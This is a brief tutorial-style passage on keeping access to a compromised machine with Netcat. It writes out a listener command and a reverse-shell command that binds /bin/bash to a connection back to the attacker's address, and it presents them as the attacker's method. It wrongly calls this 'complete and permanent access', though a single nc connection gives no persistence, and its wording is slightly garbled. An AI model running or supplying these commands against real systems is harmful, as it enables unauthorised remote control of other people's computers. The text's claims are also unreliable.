The attacker relies on a persistent connection.

The attacker must have a two-way communication channel that remains him the most time possible on the compromised system without being discovered.

For persistence, we will use the **Netcat** tool

- The attacker will start the listener
````
nc -lvp 4444 #listen on the port 4444
````

- The victim machine connects to the listener:
````
nc -vn ip_addr 4444 -e /bin/bash
````

- Now the attacker has complete and permanent access to the victim's machine
